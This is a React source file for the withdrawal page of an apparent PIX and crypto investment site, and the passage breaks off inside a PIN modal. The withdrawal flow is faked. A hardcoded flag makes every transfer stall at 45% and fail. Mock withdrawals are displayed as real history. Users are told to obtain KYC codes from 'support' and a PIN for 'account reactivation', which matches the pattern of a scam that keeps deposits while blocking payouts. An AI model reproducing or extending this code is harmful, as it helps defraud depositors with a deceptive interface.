// src/pages/Withdraw.jsx
import React, { useState, useEffect, useRef } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { 
  AlertCircle, 
  CheckCircle, 
  Wallet,
  RefreshCw,
  Shield,
  ChevronRight,
  History,
  X,
  Send,
  Lock,
  Clock,
  ArrowRight,
  Key
} from 'lucide-react';
import { toast } from 'react-toastify';
import axiosInstance from '../utils/axios';
import { useAuth } from '../context/AuthContext';

// ✅ GLOBAL WITHDRAWAL LIMIT (hardcoded)
const MAX_WITHDRAWAL_LIMIT = 100000000; // in BRL (or base currency)

const Withdraw = () => {
  const navigate = useNavigate();
  const { user, isAuthenticated, kycStatus, setKycStatus } = useAuth();
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [wallet, setWallet] = useState(null);
  const [withdrawals, setWithdrawals] = useState([]);
  
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [selectedAsset, setSelectedAsset] = useState('BRL');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [selectedNetwork, setSelectedNetwork] = useState('PIX');

  // KYC Modal states
  const [showKycModal, setShowKycModal] = useState(false);
  const [kycCode, setKycCode] = useState('');
  const [kycError, setKycError] = useState('');
  const [kycAttempts, setKycAttempts] = useState(0);
  const [isVerifyingKyc, setIsVerifyingKyc] = useState(false);
  const [pendingWithdrawalData, setPendingWithdrawalData] = useState(null);

  // Transfer simulation states
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [transferProgress, setTransferProgress] = useState(0);
  const [transferStatus, setTransferStatus] = useState('pending'); // 'pending' | 'failed' | 'complete'
  const [shouldFail] = useState(true); // set to false to simulate success
  const progressInterval = useRef(null);

  // PIN verification states
  const [showPinModal, setShowPinModal] = useState(false);
  const [pinCode, setPinCode] = useState('');
  const [pinError, setPinError] = useState('');
  const [pinAttempts, setPinAttempts] = useState(0);
  const [isVerifyingPin, setIsVerifyingPin] = useState(false);

  // Hardcoded transaction PIN (from env or fallback)
  const TRANSACTION_PIN = import.meta.env.VITE_TRANSACTION_PIN || '123456';

  // KYC codes from environment
  const getKycCodes = () => {
    const codesString = import.meta.env.VITE_KYC_CODES || '';
    return codesString.split(',').map(code => code.trim()).filter(code => code.length > 0);
  };
  const KYC_CODES = getKycCodes();

  const assets = [
    { 
      id: 'BRL', 
      name: 'Real Brasileiro', 
      network: 'PIX', 
      fee: '0,0%', 
      min: 10,
      max: 100000,
      icon: 'R$',
      color: 'from-green-500 to-emerald-500',
      bg: 'bg-green-50',
      textColor: 'text-green-600'
    },
    { 
      id: 'USDT', 
      name: 'Tether', 
      network: 'ERC-20', 
      fee: '0,1%', 
      min: 10,
      max: 100000,
      icon: '₮',
      color: 'from-green-500 to-emerald-500',
      bg: 'bg-green-50',
      textColor: 'text-green-600'
    },
    { 
      id: 'BTC', 
      name: 'Bitcoin', 
      network: 'BTC', 
      fee: '0,0005 BTC', 
      min: 0.001,
      max: 10,
      icon: '₿',
      color: 'from-orange-500 to-yellow-500',
      bg: 'bg-orange-50',
      textColor: 'text-orange-600'
    },
    { 
      id: 'ETH', 
      name: 'Ethereum', 
      network: 'ERC-20', 
      fee: '0,005 ETH', 
      min: 0.01,
      max: 100,
      icon: 'Ξ',
      color: 'from-blue-500 to-indigo-500',
      bg: 'bg-blue-50',
      textColor: 'text-blue-600'
    },
    { 
      id: 'SOL', 
      name: 'Solana', 
      network: 'SOL', 
      fee: '0,0001 SOL', 
      min: 0.1,
      max: 1000,
      icon: 'SOL',
      color: 'from-purple-500 to-pink-500',
      bg: 'bg-purple-50',
      textColor: 'text-purple-600'
    },
  ];

  const networks = [
    { id: 'PIX', name: 'PIX (Instantâneo)', fee: '0,0%', time: '10-30 s' },
    { id: 'TED', name: 'TED', fee: 'R$ 8,90', time: '1-2 h' },
    { id: 'ERC20', name: 'Ethereum (ERC-20)', fee: '0,005 ETH', time: '5-10 min' },
    { id: 'BEP20', name: 'BSC (BEP-20)', fee: '0,001 BNB', time: '3-5 min' },
    { id: 'TRC20', name: 'Tron (TRC-20)', fee: '1 TRX', time: '2-5 min' },
    { id: 'SOL', name: 'Solana', fee: '0,0001 SOL', time: '10-30 s' },
  ];

  // Mock recent withdrawals
  const mockWithdrawals = [
    { 
      id: 1,
      asset: 'BTC', 
      amount: 0.25, 
      value: 13086.25, 
      address: 'bc1qxy...wlh',
      date: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString(),
      status: 'completed',
      txHash: '0x7a3f...8e9d'
    },
    { 
      id: 2,
      asset: 'ETH', 
      amount: 2.5, 
      value: 8085.00, 
      address: '0x742d...a5d',
      date: new Date(Date.now() - 5 * 60 * 60 * 1000).toISOString(),
      status: 'completed',
      txHash: '0x4b2c...1f7a'
    },
    { 
      id: 3,
      asset: 'BRL', 
      amount: 1500, 
      value: 1500.00, 
      address: '123.456.789-00',
      date: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
      status: 'pending',
      txHash: 'PIX-123456789'
    },
  ];

  // Fetch user and wallet data
  const fetchWithdrawData = async (showToast = false) => {
    try {
      if (showToast) setRefreshing(true);
      
      const response = await axiosInstance.get('/api/user/dashboard');
      const { wallet: walletData } = response.data;
      
      setWallet(walletData);
      setWithdrawals(mockWithdrawals);

      if (showToast) {
        toast.success('Dados de saque atualizados');
      }
    } catch (err) {
      console.error('Withdraw data fetch error:', err);
      toast.error(err.response?.data?.message || 'Falha ao carregar dados de saque');
      navigate('/login');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    if (!isAuthenticated) {
      navigate('/login');
      return;
    }
    fetchWithdrawData();
  }, [isAuthenticated]);

  // Clean up interval
  useEffect(() => {
    return () => {
      if (progressInterval.current) clearInterval(progressInterval.current);
    };
  }, []);

  // Start transfer simulation when modal opens (failure path only)
  useEffect(() => {
    if (showTransferModal) {
      setTransferProgress(0);
      setTransferStatus('pending');
      let progress = 0;
      progressInterval.current = setInterval(() => {
        progress += 1;
        if (progress >= 45 && shouldFail) {
          // Stop and fail
          clearInterval(progressInterval.current);
          progressInterval.current = null;
          setTransferProgress(45);
          setTransferStatus('failed');
          toast.error('Não foi possível completar a transferência. Tente novamente.');
          return;
        }
        if (progress >= 100) {
          clearInterval(progressInterval.current);
          progressInterval.current = null;
          setTransferProgress(100);
          setTransferStatus('complete');
          toast.success('Transferência concluída com sucesso!');
          return;
        }
        setTransferProgress(progress);
      }, 100);
    } else {
      // Reset when modal closes
      if (progressInterval.current) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
      }
      setTransferProgress(0);
      setTransferStatus('pending');
    }
  }, [showTransferModal, shouldFail]);

  // Submit withdrawal (after validation & KYC check)
  const submitWithdrawal = async () => {
    setIsProcessing(true);
    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Decide flow based on shouldFail
      if (shouldFail) {
        // Failure simulation
        setShowTransferModal(true);
      } else {
        // Account reactivated → request security PIN
        setShowPinModal(true);
      }
      
      setWithdrawAmount('');
      setWithdrawAddress('');
      
      // Optionally refresh data
      fetchWithdrawData();
    } catch (err) {
      toast.error(err.response?.data?.message || 'Falha no saque');
    } finally {
      setIsProcessing(false);
    }
  };

  // Handle PIN verification
  const handleVerifyPin = () => {
    const pin = pinCode.trim();
    if (!pin) {
      setPinError('Por favor, insira o PIN de segurança.');
      return;
    }

    setIsVerifyingPin(true);
    setPinError('');

    setTimeout(() => {
      if (pin === TRANSACTION_PIN) {
        // Correct PIN – show success modal
        setShowPinModal(false);
        setPinCode('');
        setPinAttempts(0);
        setPinError('');
        setIsVerifyingPin(false);
        // Show success transfer modal
        setShowTransferModal(true);
        // Override the progress to complete immediately
        setTransferProgress(100);
        setTransferStatus('complete');
        toast.success('Transferência concluída com sucesso!');
      } else {
        const newAttempts = pinAttempts + 1;
        setPinAttempts(newAttempts);
        if (newAttempts >= 3) {
          setPinError('PIN incorreto. Você excedeu o número máximo de tentativas.');
          toast.error('Muitas tentativas falhas. A transação foi cancelada.');
          setShowPinModal(false);
          setPinCode('');
          setPinAttempts(0);
          setPinError('');
        } else {
          setPinError(`PIN incorreto. ${3 - newAttempts} tentativa(s) restante(s).`);
          setPinCode('');
        }
        setIsVerifyingPin(false);
      }
    }, 800);
  };

  // Main withdraw handler
  const handleWithdraw = async (e) => {
    e.preventDefault();
    
    if (!withdrawAmount || !withdrawAddress) {
      toast.error('Por favor, preencha todos os campos');
      return;
    }

    const amount = parseFloat(withdrawAmount);
    const selected = assets.find(a => a.id === selectedAsset);
    
    if (amount < selected.min) {
      toast.error(`Saque mínimo é ${selected.min} ${selectedAsset}`);
      return;
    }

    // ✅ Global withdrawal limit check
    if (amount > MAX_WITHDRAWAL_LIMIT) {
      toast.error(`Limite máximo de saque é ${MAX_WITHDRAWAL_LIMIT} BRL (ou equivalente)`);
      return;
    }

    if (amount > wallet?.balance) {
      toast.error('Saldo insuficiente');
      return;
    }

    // If KYC is not yet approved, open KYC modal and store data
    if (kycStatus !== 'approved') {
      setPendingWithdrawalData({
        amount,
        asset: selectedAsset,
        address: withdrawAddress,
        network: selectedNetwork,
        assetData: selected
      });
      setShowKycModal(true);
      return;
    }

    // KYC already approved → submit directly
    await submitWithdrawal();
  };

  // KYC verification logic
  const handleVerifyKycCode = () => {
    const code = kycCode.trim();
    if (!code) {
      setKycError('Por favor, insira o código de verificação');
      return;
    }

    if (typeof setKycStatus !== 'function') {
      console.error('setKycStatus is not a function!');
      toast.error('Erro interno. Por favor, recarregue a página.');
      return;
    }

    setIsVerifyingKyc(true);
    setKycError('');

    setTimeout(() => {
      if (KYC_CODES.includes(code)) {
        setKycStatus('approved');
        toast.success('Verificação KYC concluída com sucesso! 🎉');
        setShowKycModal(false);
        setKycCode('');
        setKycAttempts(0);
        setKycError('');
        // After successful KYC, submit the withdrawal
        submitWithdrawal();
      } else {
        const newAttempts = kycAttempts + 1;
        setKycAttempts(newAttempts);
        
        if (newAttempts >= 3) {
          setKycError('Código inválido. Você excedeu o número máximo de tentativas.');
          toast.error('Muitas tentativas falhas. Clique em "Sacar Fundos" para recomeçar.');
          setKycAttempts(0);
          setShowKycModal(false);
          setKycCode('');
          setKycStatus('rejected');
        } else {
          setKycError(`Código inválido. ${3 - newAttempts} tentativa(s) restante(s).`);
          setKycCode('');
        }
      }
      setIsVerifyingKyc(false);
    }, 1000);
  };

  const handleRefresh = () => {
    fetchWithdrawData(true);
  };

  const getStatusBadge = (status) => {
    switch(status) {
      case 'completed':
        return <span className="px-2 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium">Concluído</span>;
      case 'pending':
        return <span className="px-2 py-1 bg-yellow-50 text-yellow-700 rounded-full text-xs font-medium">Pendente</span>;
      case 'failed':
        return <span className="px-2 py-1 bg-red-50 text-red-700 rounded-full text-xs font-medium">Falhou</span>;
      default:
        return null;
    }
  };

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMs / 3600000);
    const diffDays = Math.floor(diffMs / 86400000);

    if (diffMins < 60) return `${diffMins} min atrás`;
    if (diffHours < 24) return `${diffHours} h atrás`;
    if (diffDays < 7) return `${diffDays} d atrás`;
    return date.toLocaleDateString('pt-BR', { month: 'short', day: 'numeric' });
  };

  const formatCurrency = (value) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
    }).format(value || 0);
  };

  const KYCWarning = () => (
    <div className="bg-yellow-50/80 backdrop-blur-sm border-l-4 border-yellow-400 p-4 rounded-2xl mb-6">
      <div className="flex items-start">
        <AlertCircle className="w-5 h-5 text-yellow-400 mt-0.5 mr-3 flex-shrink-0" />
        <div>
          <h3 className="text-sm font-medium text-yellow-800">Verificação KYC Necessária</h3>
          <p className="text-sm text-yellow-700 mt-1">
            Você precisa completar a verificação KYC antes de poder sacar fundos.
          </p>
          <Link to="/kyc" className="mt-3 inline-flex items-center text-sm font-medium text-yellow-800 hover:text-yellow-900">
            Completar KYC Agora
            <ChevronRight className="w-4 h-4 ml-1" />
          </Link>
        </div>
      </div>
    </div>
  );

  const KYCStatus = () => {
    if (kycStatus === 'approved') {
      return (
        <div className="bg-green-50/80 backdrop-blur-sm border-l-4 border-green-400 p-4 rounded-2xl mb-6">
          <div className="flex items-center">
            <CheckCircle className="w-5 h-5 text-green-400 mr-3" />
            <p className="text-sm text-green-700 font-medium">KYC Verificado - Você pode sacar fundos</p>
          </div>
        </div>
      );
    }
    return <KYCWarning />;
  };

  const selectedAssetData = assets.find(a => a.id === selectedAsset);

  if (loading) {
    return (
      <div className="min-h-screen bg-[#f8fafc] flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando dados de saque...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f8fafc]">
      {/* Page Header */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-4 sm:pt-6 pb-2">
        <div className="flex items-center justify-between">
          <h1 className="text-xl sm:text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
            Sacar Fundos
          </h1>
          <div className="flex items-center space-x-2">
            <button 
              onClick={handleRefresh}
              disabled={refreshing}
              className="p-2 hover:bg-gray-100 rounded-lg transition-colors"
            >
              <RefreshCw className={`w-5 h-5 text-gray-600 ${refreshing ? 'animate-spin' : ''}`} />
            </button>
            <Link to="/history" className="p-2 hover:bg-gray-100 rounded-lg transition-colors">
              <History className="w-5 h-5 text-gray-600" />
            </Link>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 sm:py-8">
        {/* KYC Status */}
        <KYCStatus />

        {/* Main Content */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 sm:gap-6">
          {/* Withdrawal Form */}
          <div className="lg:col-span-2">
            <div className="bg-white rounded-2xl sm:rounded-3xl shadow-sm border border-gray-100 p-4 sm:p-6">
              <h2 className="text-base sm:text-lg font-semibold text-gray-900 mb-4 sm:mb-6">Detalhes do Saque</h2>

              <form onSubmit={handleWithdraw} className="space-y-4 sm:space-y-6">
                {/* Asset Selection */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2 sm:mb-3">
                    Selecionar Ativo
                  </label>
                  <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-2 sm:gap-3">
                    {assets.map((asset) => (
                      <button
                        key={asset.id}
                        type="button"
                        onClick={() => setSelectedAsset(asset.id)}
                        className={`p-3 sm:p-4 rounded-xl border-2 transition-all duration-300 relative overflow-hidden group
                          ${selectedAsset === asset.id 
                            ? `border-${asset.color.split('-')[1]}-500 bg-gradient-to-br ${asset.color} bg-opacity-10` 
                            : 'border-gray-200 hover:border-gray-300'}`}
                      >
                        <div className={`absolute inset-0 bg-gradient-to-br ${asset.color} opacity-0 group-hover:opacity-5 transition-opacity`} />
                        <div className="relative text-center">
                          <span className="text-xl sm:text-2xl mb-1 block">{asset.icon}</span>
                          <p className="font-semibold text-xs sm:text-sm">{asset.name}</p>
                          <p className="text-[10px] sm:text-xs text-gray-500">{asset.network}</p>
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                {/* Network Selection */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2 sm:mb-3">
                    Selecionar Rede
                  </label>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-3">
                    {networks.map((network) => (
                      <button
                        key={network.id}
                        type="button"
                        onClick={() => setSelectedNetwork(network.id)}
                        className={`p-3 sm:p-4 rounded-xl border-2 transition-all text-left
                          ${selectedNetwork === network.id 
                            ? 'border-blue-500 bg-blue-50' 
                            : 'border-gray-200 hover:border-gray-300'}`}
                      >
                        <p className="font-semibold text-xs sm:text-sm">{network.name}</p>
                        <div className="flex items-center justify-between mt-1 sm:mt-2">
                          <span className="text-[10px] sm:text-xs text-gray-500">Taxa: {network.fee}</span>
                          <span className="text-[10px] sm:text-xs text-gray-400">{network.time}</span>
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                {/* Amount Input */}
                <div>
                  <div className="flex items-center justify-between mb-1 sm:mb-2">
                    <label className="block text-sm font-medium text-gray-700">
                      Valor do Saque
                    </label>
                    <span className="text-xs text-gray-500">
                      Disponível: {formatCurrency(wallet?.balance || 0)}
                    </span>
                  </div>
                  <div className="relative">
                    <span className="absolute left-3 sm:left-4 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium text-sm sm:text-base">
                      R$
                    </span>
                    <input
                      type="number"
                      value={withdrawAmount}
                      onChange={(e) => setWithdrawAmount(e.target.value)}
                      className="w-full pl-10 sm:pl-12 pr-20 sm:pr-24 py-3 sm:py-4 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all text-base sm:text-lg"
                      placeholder="0,00"
                      min={selectedAssetData?.min}
                      max={Math.min(MAX_WITHDRAWAL_LIMIT, wallet?.balance || Infinity)}
                      step="0.01"
                    />
                    <div className="absolute right-2 sm:right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-1 sm:space-x-2">
                      <button
                        type="button"
                        onClick={() => {
                          const maxAllowed = Math.min(MAX_WITHDRAWAL_LIMIT, wallet?.balance || 0);
                          setWithdrawAmount(maxAllowed > 0 ? maxAllowed.toString() : '');
                        }}
                        className="px-1.5 sm:px-2 py-0.5 sm:py-1 bg-gray-100 rounded-lg text-[10px] sm:text-xs font-medium hover:bg-gray-200 transition-colors"
                      >
                        MÁX
                      </button>
                      <span className="text-xs sm:text-sm text-gray-500">{selectedAsset}</span>
                    </div>
                  </div>
                  <div className="flex items-center justify-between mt-1 sm:mt-2">
                    <span className="text-[10px] sm:text-xs text-gray-500">
                      Mín: {selectedAssetData?.id === 'BRL' ? formatCurrency(selectedAssetData?.min) : `${selectedAssetData?.min} ${selectedAssetData?.id}`}
                    </span>
                    <span className="text-[10px] sm:text-xs text-gray-500">
                      Máx: {formatCurrency(Math.min(MAX_WITHDRAWAL_LIMIT, wallet?.balance || 0))}
                    </span>
                  </div>
                  {/* Global limit warning */}
                  <div className="mt-1 sm:mt-2 p-2 bg-blue-50 rounded-lg border border-blue-100">
                    <p className="text-[10px] sm:text-xs text-blue-700 flex items-center">
                      <AlertCircle className="w-3 h-3 mr-1 flex-shrink-0" />
                      Limite global de saque: <strong className="ml-1">{formatCurrency(MAX_WITHDRAWAL_LIMIT)}</strong> por transação.
                    </p>
                  </div>
                </div>

                {/* Wallet Address / PIX Key */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                    {selectedAsset === 'BRL' ? 'Chave PIX / Dados Bancários' : 'Endereço de Saque'}
                  </label>
                  <div className="relative">
                    <Wallet className="absolute left-3 sm:left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 sm:w-5 sm:h-5" />
                    <input
                      type="text"
                      value={withdrawAddress}
                      onChange={(e) => setWithdrawAddress(e.target.value)}
                      className="w-full pl-10 sm:pl-12 pr-3 sm:pr-4 py-3 sm:py-4 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all text-sm sm:text-base"
                      placeholder={selectedAsset === 'BRL' ? 'CPF, E-mail, Telefone ou Chave aleatória' : `Digite o endereço ${selectedAsset}`}
                    />
                  </div>
                  <p className="text-[10px] sm:text-xs text-gray-500 mt-1 sm:mt-2 flex items-center">
                    <AlertCircle className="w-3 h-3 mr-1 flex-shrink-0" />
                    {selectedAsset === 'BRL' 
                      ? 'Certifique-se de que os dados bancários estão corretos antes de prosseguir.' 
                      : `Envie apenas ${selectedAsset} para este endereço. Verifique o endereço antes de prosseguir.`}
                  </p>
                </div>

                {/* Fee Breakdown */}
                <div className="bg-gray-50 rounded-xl p-3 sm:p-4">
                  <h3 className="font-semibold text-sm mb-2 sm:mb-3">Detalhamento da Transação</h3>
                  <div className="space-y-1 sm:space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-600 text-xs sm:text-sm">Valor:</span>
                      <span className="font-semibold text-xs sm:text-sm">{formatCurrency(parseFloat(withdrawAmount || 0))}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600 text-xs sm:text-sm">Taxa da Rede:</span>
                      <span className="font-semibold text-xs sm:text-sm">
                        {assets.find(a => a.id === selectedAsset)?.fee || '0'}
                      </span>
                    </div>
                    <div className="flex justify-between pt-1 sm:pt-2 border-t">
                      <span className="text-gray-600 text-xs sm:text-sm">Você Receberá:</span>
                      <span className="font-semibold text-blue-600 text-xs sm:text-sm">
                        {formatCurrency(parseFloat(withdrawAmount || 0) * 0.999)}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isProcessing}
                  className="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold py-3 sm:py-4 px-6 rounded-xl transition-all hover:scale-105 hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-sm sm:text-base"
                >
                  {isProcessing ? (
                    <span className="flex items-center justify-center">
                      <RefreshCw className="w-4 h-4 sm:w-5 sm:h-5 animate-spin mr-2" />
                      Processando...
                    </span>
                  ) : (
                    'Sacar Fundos'
                  )}
                </button>

                {/* Security Note */}
                <div className="flex items-start space-x-2 sm:space-x-3 p-3 sm:p-4 bg-blue-50 rounded-xl">
                  <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-xs sm:text-sm font-medium text-blue-800">Verificação de Segurança</p>
                    <p className="text-[10px] sm:text-xs text-blue-700 mt-0.5 sm:mt-1">
                      Para sua segurança, saques estão sujeitos a uma revisão de 24 horas para primeiros saques. 
                      Endereços na lista branca são processados instantaneamente.
                    </p>
                  </div>
                </div>
              </form>
            </div>
          </div>

          {/* Sidebar */}
          <div className="space-y-4 sm:space-y-6">
            {/* Balance Card */}
            <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl sm:rounded-3xl p-4 sm:p-6 text-white">
              <h3 className="text-xs sm:text-sm font-medium text-gray-400 mb-1 sm:mb-2">Saldo Disponível</h3>
              <p className="text-2xl sm:text-3xl font-bold mb-3 sm:mb-4">{formatCurrency(wallet?.balance || 0)}</p>
              
              <div className="space-y-2 sm:space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <span className="text-base sm:text-lg">💰</span>
                    <span className="text-xs sm:text-sm">Saldo Total</span>
                  </div>
                  <span className="text-xs sm:text-sm font-medium">{formatCurrency(wallet?.balance || 0)}</span>
                </div>
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <span className="text-base sm:text-lg">📈</span>
                    <span className="text-xs sm:text-sm">Lucro Total</span>
                  </div>
                  <span className="text-xs sm:text-sm font-medium text-green-400">+{formatCurrency(wallet?.profit || 0)}</span>
                </div>
              </div>

              <div className="mt-3 sm:mt-4 pt-3 sm:pt-4 border-t border-gray-700">
                <Link to="/invest" className="flex items-center justify-between text-xs sm:text-sm text-blue-400 hover:text-blue-300">
                  <span>Depositar mais fundos</span>
                  <span className="text-base sm:text-lg">→</span>
                </Link>
              </div>
            </div>

            {/* Network Status */}
            <div className="bg-white rounded-2xl sm:rounded-3xl p-4 sm:p-6 shadow-sm border border-gray-100">
              <h3 className="font-semibold text-gray-900 text-sm sm:text-base mb-2 sm:mb-3">Status da Rede</h3>
              <div className="space-y-1.5 sm:space-y-2">
                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <span className="text-gray-600">PIX</span>
                  <div className="flex items-center">
                    <span className="w-1.5 sm:w-2 h-1.5 sm:h-2 bg-green-500 rounded-full mr-1.5 sm:mr-2"></span>
                    <span className="text-gray-900 text-xs sm:text-sm">Operacional</span>
                  </div>
                </div>
                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <span className="text-gray-600">Ethereum</span>
                  <div className="flex items-center">
                    <span className="w-1.5 sm:w-2 h-1.5 sm:h-2 bg-green-500 rounded-full mr-1.5 sm:mr-2"></span>
                    <span className="text-gray-900 text-xs sm:text-sm">Operacional</span>
                  </div>
                </div>
                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <span className="text-gray-600">Bitcoin</span>
                  <div className="flex items-center">
                    <span className="w-1.5 sm:w-2 h-1.5 sm:h-2 bg-green-500 rounded-full mr-1.5 sm:mr-2"></span>
                    <span className="text-gray-900 text-xs sm:text-sm">Operacional</span>
                  </div>
                </div>
                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <span className="text-gray-600">Solana</span>
                  <div className="flex items-center">
                    <span className="w-1.5 sm:w-2 h-1.5 sm:h-2 bg-yellow-500 rounded-full mr-1.5 sm:mr-2"></span>
                    <span className="text-gray-900 text-xs sm:text-sm">Congestionada</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Recent Withdrawals Preview */}
            {withdrawals.length > 0 && (
              <div className="bg-white rounded-2xl sm:rounded-3xl p-4 sm:p-6 shadow-sm border border-gray-100">
                <h3 className="font-semibold text-gray-900 text-sm sm:text-base mb-3 sm:mb-4">Saques Recentes</h3>
                <div className="space-y-2 sm:space-y-3">
                  {withdrawals.slice(0, 3).map((withdrawal) => (
                    <div key={withdrawal.id} className="flex items-center justify-between p-2 hover:bg-gray-50 rounded-lg transition-colors">
                      <div>
                        <p className="font-medium text-xs sm:text-sm">{withdrawal.amount} {withdrawal.asset}</p>
                        <p className="text-[10px] sm:text-xs text-gray-500">{formatDate(withdrawal.date)}</p>
                      </div>
                      <div>
                        {getStatusBadge(withdrawal.status)}
                      </div>
                    </div>
                  ))}
                </div>
                <Link to="/history" className="mt-2 sm:mt-3 text-[10px] sm:text-xs text-blue-600 hover:text-blue-700 font-medium flex items-center justify-center">
                  Ver todos os saques
                  <ChevronRight className="w-3 h-3 ml-1" />
                </Link>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* KYC CODE MODAL */}
      {showKycModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md mx-4 shadow-2xl">
            <div className="flex justify-between items-start mb-3 sm:mb-4">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <Lock className="w-5 h-5 sm:w-6 sm:h-6 text-blue-600" />
                  <h3 className="text-base sm:text-lg font-semibold text-gray-900">Verificação KYC</h3>
                </div>
                <p className="text-xs sm:text-sm text-gray-500 mt-1">
                  Para prosseguir com o saque, insira o código de verificação fornecido pela nossa equipe de suporte.
                </p>
              </div>
              <button
                onClick={() => setShowKycModal(false)}
                className="p-1 hover:bg-gray-100 rounded-lg transition-colors"
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500" />
              </button>
            </div>

            <div className="my-3 sm:my-4">
              <label htmlFor="kycCodeInput" className="block text-sm font-medium text-gray-700 mb-1">
                Código de Verificação
              </label>
              <input
                id="kycCodeInput"
                type="text"
                placeholder="Digite o código de 6 dígitos"
                value={kycCode}
                onChange={(e) => setKycCode(e.target.value)}
                className={`w-full px-3 sm:px-4 py-2.5 sm:py-3 border ${kycError ? 'border-red-500' : 'border-gray-200'} rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all text-sm sm:text-base`}
                autoFocus
              />
              {kycError && (
                <div className="flex items-center gap-2 mt-2 text-red-600 text-xs sm:text-sm">
                  <AlertCircle className="w-3 h-3 sm:w-4 sm:h-4 flex-shrink-0" />
                  <span>{kycError}</span>
                </div>
              )}
              {kycAttempts > 0 && kycAttempts < 3 && (
                <p className="text-xs text-gray-500 mt-2">
                  Tentativas restantes: {3 - kycAttempts}
                </p>
              )}
            </div>

            <div className="flex flex-col sm:flex-row gap-2 sm:gap-3">
              <button
                onClick={handleVerifyKycCode}
                disabled={isVerifyingKyc || kycAttempts >= 3}
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 sm:py-3 rounded-xl transition-all disabled:opacity-50 flex items-center justify-center gap-2 text-sm sm:text-base"
              >
                {isVerifyingKyc ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    Verificando...
                  </>
                ) : (
                  <>
                    <Send className="w-4 h-4 sm:w-5 sm:h-5" />
                    Verificar Código
                  </>
                )}
              </button>
              <button
                onClick={() => setShowKycModal(false)}
                className="px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors text-sm sm:text-base"
              >
                Cancelar
              </button>
            </div>

            {kycAttempts >= 3 && (
              <div className="mt-3 p-3 bg-red-50 rounded-lg">
                <p className="text-center text-xs sm:text-sm text-red-600">
                  <AlertCircle className="w-3 h-3 sm:w-4 sm:h-4 inline-block mr-1" />
                  Muitas tentativas falhas. Clique em "Sacar Fundos" para recomeçar.
                </p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* SECURITY PIN MODAL (for account reactivation) */}
      {showPinModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md mx-4 shadow-2xl">
            <div className="flex justify-between items-start mb-3 sm:mb-4">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <Key className="w-5 h-5 sm:w-6 sm:h-6 text-blue-600" />
                  <h3 className="text-base sm:text-lg font-semibold text-gray-900">Verificação de Segurança</h3>
                </div>
                <p className="text-xs sm:text-sm text-gray-500 mt-1">
